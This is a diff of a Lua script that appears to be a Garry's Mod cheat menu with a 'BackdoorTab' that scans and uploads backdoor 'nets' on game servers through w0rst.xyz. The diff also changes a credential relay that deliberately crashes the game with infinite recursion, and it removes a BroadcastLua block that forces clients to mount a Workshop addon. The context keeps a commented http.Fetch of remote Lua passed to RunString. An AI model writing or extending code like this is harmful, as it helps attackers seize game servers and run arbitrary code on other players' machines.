@@ -135,16 +135,10 @@ local function Unload()
 end
 
 local function Relay()
-    local function crash() return crash() end
     if not file.Exists("w0rst/login.txt", "DATA") then crash() return end
     local UserInfo = string.Split(file.Read("w0rst/login.txt"), ":")
-    http.Post("https://w0rst.xyz/project/api/relay.php", {
-        user = UserInfo[1],
-        pass = UserInfo[2] }, function(b)
-        local s = string.Split(b, " ");
-        if(s[1] == "a4dF91aE25c2BFD11F879e42") then
-            crash()
-        end
+    http.Post("https://w0rst.xyz/project/api/session.php", { user = UserInfo[1], pass = UserInfo[2] }, function(b)
+        if(b ~= "Authed") then local function crash() return crash() end crash() end
     end)
 end
 
@@ -1980,7 +1974,7 @@ CreateBDClient("NoClip",  function()
 end)
 
 CreateButton("Net-Scan", BackdoorTab, 115, 30, 20, 520, function()
-    http.Post("https://w0rst.xyz/project/api/netsys.php", { method = "9fbDeC7b2bA1656b26dC4b7a" }, function(b)
+    http.Post("https://w0rst.xyz/project/api/transfer.php", { method = "display" }, function(b)
         local Nets = string.Split(b, " ")
         local Selected = false
         for k, v in pairs(Nets) do
@@ -2009,7 +2003,7 @@ end)
 CreateButton("Add-Net", BackdoorTab, 115, 30, 260, 520, function()
     CreateInputBox("Net", function(str)
         local UserInfo = string.Split(file.Read("w0rst/login.txt"), ":")
-        http.Post("https://w0rst.xyz/project/api/netsys.php", { method = "A0791AfFA0F30EdCee1EdADb", u = UserInfo[1], p = UserInfo[2], n = str }, function(b)
+        http.Post("https://w0rst.xyz/project/api/transfer.php", { method = "upload", user = UserInfo[1], pass = UserInfo[2], net = str }, function(b)
             if b[1] == "0" then
                 Log("Uploaded Net "..str)
             elseif b[1] == "1" then
@@ -2157,12 +2151,6 @@ CreateButton("Play URL", SoundsTab, 495, 25, 10, 528, function()
         Log("Playing: " .. str)
     end)
 end)
-
--- BroadcastLua([[
---     steamworks.Subscribe(2384188626)
---     steamworks.SetShouldMountAddon(2384188626, true )
---     steamworks.ApplyAddons()
--- ]])
 
 --[[
     http.Fetch("https://w0rst.xyz/project/func/load.lua", RunString)
